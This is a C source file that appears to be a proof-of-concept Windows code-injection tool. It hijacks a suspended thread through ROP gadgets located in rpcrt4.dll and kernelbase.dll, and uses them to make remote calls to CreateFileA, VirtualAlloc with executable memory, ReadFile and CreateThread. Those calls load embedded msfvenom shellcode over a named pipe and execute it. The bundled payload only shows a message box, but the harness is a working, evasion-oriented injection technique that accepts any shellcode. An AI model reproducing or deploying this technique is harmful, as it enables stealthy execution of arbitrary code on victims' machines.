#include <Windows.h>

#include <stdio.h>
#include <stdint.h>

#define ArraySize(x) (sizeof x / sizeof x[0])

typedef struct Gadgets {
    UINT_PTR pshc; // push Rdx; call Rax
    UINT_PTR jmps; // jmp $
    UINT_PTR ret;  // ret
} Gadgets;

// msfvenom -p windows/x64/messagebox -f c --platform windows
unsigned char buf[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x2a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x1f\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
"\x20\x4d\x53\x46\x21\x00\x4d\x65\x73\x73\x61\x67\x65\x42"
"\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

UINT_PTR find_gadget(const unsigned char* pattern, int sz, const char* name) {
    HMODULE base = GetModuleHandleA(name);
    if (!base) {
        return 0;
    }

    // Adjust for 64-bit pointers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)base + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    // Locate the .text section
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((const char*)sectionHeader[i].Name, ".text") == 0) {
            uintptr_t ptr = (uintptr_t)base + sectionHeader[i].VirtualAddress;
            size_t virtsize = sectionHeader[i].SizeOfRawData;
            size_t c = 0;

            // Search for the pattern
            while (c + sz <= virtsize && memcmp(pattern, (const unsigned char*)(ptr + c), sz) != 0) {
                c++;
            }
            if (c + sz <= virtsize) {
                return ptr + c; // Return the address of the found pattern
            }
            else {
                return 0; // Pattern not found
            }
        }
    }
    return 0; // No .text section found
}

//wait for user time to increase, signify kernel exit, thread can be manipulated
void waitunblock(HANDLE thd) {
    FILETIME a, b, c, d;
    GetThreadTimes(thd, &a, &b, &c, &d);
    DWORD pt = d.dwLowDateTime;
    while (1) {
        Sleep(2);
        GetThreadTimes(thd, &a, &b, &c, &d);
        if (d.dwLowDateTime - pt > 9) break; //when user time is >90% of total time, we're probably done
        pt = d.dwLowDateTime;
    }
    return;
}

void slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d) {

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    ctx.Rsp += 8;

    //ctx.Rsp -= 32;

    if (ctx.Rsp != (ctx.Rsp & ~0x0F)) {
       //ctx.Rsp = (ctx.Rsp & ~0x0F);
        printf("weird stack");
    }

    ctx.Rip = gadgets.ret;

    ctx.Rcx = a;
    ctx.Rdx = b;
    ctx.R8  = c;
    ctx.R9  = d;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
}

DWORD64 pushm(HANDLE thd, Gadgets gadgets, DWORD64 data) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };

    GetThreadContext(thd, &ctx);

    ctx.Rsp += 8;
    ctx.Rip = gadgets.pshc;
    ctx.Rdx = data;
    ctx.Rax = gadgets.jmps;


    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(2);
    SuspendThread(thd);

    return ctx.Rsp - 8;
}

void push_junk(HANDLE hThread, Gadgets gadgets) {
    
    SuspendThread(hThread);
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    
    GetThreadContext(hThread, &ctx);

    ctx.Rdx = 0;
    ctx.Rip = gadgets.pshc;
    ctx.Rax = gadgets.jmps;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    Sleep(2);
    SuspendThread(hThread);
}

//push val to stack, but returns return val of previous fn called (in eax)
DWORD64 get_ret_push_old(HANDLE hThread, Gadgets gadgets, DWORD64 data) {

    CONTEXT ctx = {.ContextFlags = CONTEXT_FULL};
    SuspendThread(hThread);
    
    GetThreadContext(hThread, &ctx);

    ctx.Rip = gadgets.pshc;
    DWORD64 addr = ctx.Rax;
    ctx.Rdx = data;
    ctx.Rax = gadgets.jmps;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    Sleep(2);
    SuspendThread(hThread);
    return addr;
}

//push val to stack, but returns return val of previous fn called (in eax)
DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    SuspendThread(hThread);

    GetThreadContext(hThread, &ctx);
    return ctx.Rax;

    //ctx.Rip = gadgets.pshc;
    //DWORD64 addr = ctx.Rax;
    //ctx.Rdx = data;
    //ctx.Rax = gadgets.jmps;

    //SetThreadContext(hThread, &ctx);
    //ResumeThread(hThread);
    //Sleep(2);
    //SuspendThread(hThread);
    //return addr;
}

void TestFunc(DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d, DWORD64 e, DWORD64 f, DWORD64 g) {
    printf("a: %llu\n", a);
    printf("b: %llu\n", b);
    printf("c: %llu\n", c);
    printf("d: %llu\n", d);
    printf("e: %llu\n", e);
    printf("f: %llu\n", f);
    printf("g: %llu\n", g);
    //printf("h: %llu\n", h);
}


DWORD WINAPI ThreadFunc(LPVOID lpParam) {
    char test[100] = {0};
    while (1) {
        printf("[*] Victum Thread is running...\n");
        Sleep(100);
    }
    return 0;
}

DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, void* funcAddr, BOOL alignStack, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {

    // 1. Check/Fix Stack
    if (alignStack) {
        pushm(hThread, gadgets, 0x00);
    }

    // 2. PUSH function parameters
    for (uint64_t i = count; i > 4; i--) {
        pushm(hThread, gadgets, parameters[i-1]);
    }

    // 3. PUSH shadow space if required
    if (count > 4) {
        pushm(hThread, gadgets, 0x00);
        pushm(hThread, gadgets, 0x00);
        pushm(hThread, gadgets, 0x00);
        pushm(hThread, gadgets, 0x00);
    }

    // 4. PUSH jmps save return pointer
    pushm(hThread, gadgets, gadgets.jmps);

    // 5. PUSH function to call address
    pushm(hThread, gadgets, funcAddr);

    // 6. Execute with ret gadget
    slay(hThread, gadgets, 
        (count > 0 ? parameters[0] : 0),
        (count > 1 ? parameters[1] : 0),
        (count > 2 ? parameters[2] : 0),
        (count > 3 ? parameters[3] : 0)
    );

    // 7. Ensure the thread _did_ something
    waitunblock(hThread);

    // 8. Get return value if required
    return (returnVal ? get_ret_val(hThread, gadgets) : 0);
}

int main(void) {

    HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread failed with error code: %lu\n", GetLastError());
        return 1;
    }

    if (LoadLibraryA("rpcrt4.dll") == NULL) {
        printf("[!] LoadLibraryA failed with error code: %lu\n", GetLastError());
        return 1;
    }

    Gadgets gadgets = {
        .pshc = find_gadget("\x52\xFF\xD0", 3, "rpcrt4.dll"),     // push rdx; call rax
        .jmps = find_gadget("\xEB\xFE",     2, "kernelbase.dll"), // jmp $
        .ret  = find_gadget("\xC3",         1, "kernelbase.dll"), // ret
    };

    if (gadgets.pshc == 0 || gadgets.jmps == 0 || gadgets.ret == 0) {
        printf("[!] Gadgets could not be found\n");
        return 1;
    }

    const char pipename[] = "\\\\.\\pipe\\spooky";
    if (ArraySize(pipename) % 8 != 0) {
        printf("[!] pipename (including the null byte) MUST be a multiple of 8\n");
        return 1;
    }

    const UINT32 HeapAllocSize = 0x2000;

    // Set RIP to a `jmp $`, blocks when kernel exit
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    ctx.Rip = gadgets.jmps;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    printf("[*] Primed thread, waiting for kernel exit...\n");

    // Wait for thread's user time to increase, signifying kernel exit
    waitunblock(hThread);
    printf("[*] Process exited kernel, ready for injection\n");

    // Push a junk val to stack, this is quite useless but it simplifies the code
    push_junk(hThread, gadgets);

    HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, HeapAllocSize, 0, 5000, NULL);
    if (pipe == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipeA failed with error code: %lu\n", GetLastError());
        return 1;
    }

    DWORD64 fnVirtualAlloc = (DWORD64)GetProcAddress(GetModuleHandleA("kernelbase.dll"), "VirtualAlloc");
    DWORD64 fnCreateFileA  = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CreateFileA");
    DWORD64 fnCreateThread = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CreateThread");
    DWORD64 fnCloseHandle  = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CloseHandle");
    DWORD64 fnReadFile     = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "ReadFile");

    DWORD64 namptr = 0;
    for (int j = ArraySize(pipename); j > 0; j -= 8) {
        DWORD64 num = *(DWORD64*)(pipename + j - 8);
        namptr = pushm(hThread, gadgets, num);
    }
    printf("[*] Pipe name injected to stack\n");

    // CreateFileA
    HANDLE phand = (HANDLE)CallFuncRemote(hThread, gadgets, fnCreateFileA, TRUE, TRUE, 7, (DWORD64[]) { namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0});
    if (phand == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA returned a bad HANDLE\n");
        return 1;
    }

    // VirtualAlloc
    DWORD64 addr = CallFuncRemote(hThread, gadgets, fnVirtualAlloc, TRUE, TRUE, 4, (DWORD64[]) { 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE });
    if (!addr) {
        printf("[*] VirtualAlloc Failed\n");
        return 1;
    }
    printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr);

    // Write Shellcode
    DWORD bw = 0;
    WriteFile(pipe, buf, sizeof(buf), &bw, NULL);

    // ReadFile
    CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, FALSE, 5, (DWORD64[]) { phand, addr, HeapAllocSize, namptr, 0 });
    printf("[*] ReadFile called\n");


    // CloseHandle
    CallFuncRemote(hThread, gadgets, fnCloseHandle, TRUE, FALSE, 1, (DWORD64[]) { phand });
    printf("[*] CloseHandle called\n");


    // CreateThread
    CallFuncRemote(hThread, gadgets, fnCreateThread, TRUE, FALSE, 6, (DWORD64[]) { 0, 0, addr, 0, 0, 0 });
    printf("[*] CreateThread called\n");

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
